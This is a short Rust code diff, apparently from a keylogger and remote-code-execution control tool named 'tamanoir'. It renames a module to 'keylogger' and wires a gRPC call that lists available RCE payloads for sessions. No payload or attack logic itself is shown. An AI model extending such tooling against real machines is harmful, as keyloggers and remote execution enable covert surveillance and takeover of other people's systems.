@@ -10,7 +10,7 @@ use tonic::{transport::Channel, Request};
 use crate::{
     app::{AppResult, SessionsMap},
     section::{
-        session::utils::init_keymaps,
+        keylogger::utils::init_keymaps,
         shell::{ShellCmd, ShellCmdHistory, ShellStdType},
     },
     tamanoir_grpc::{
@@ -90,9 +90,12 @@ impl RceServiceClient {
             .await?;
         Ok(())
     }
-    pub async fn list_available_rce() -> AppResult<Vec<SessionRcePayload>> {
-        let res = vec![];
-        Ok(res)
+    pub async fn list_available_rce(&mut self) -> anyhow::Result<Vec<SessionRcePayload>> {
+        let res = self
+            .client
+            .list_available_rce(Request::new(Empty {}))
+            .await?;
+        Ok(res.into_inner().rce_list)
     }
 }
 pub trait StreamReceiver<T> {
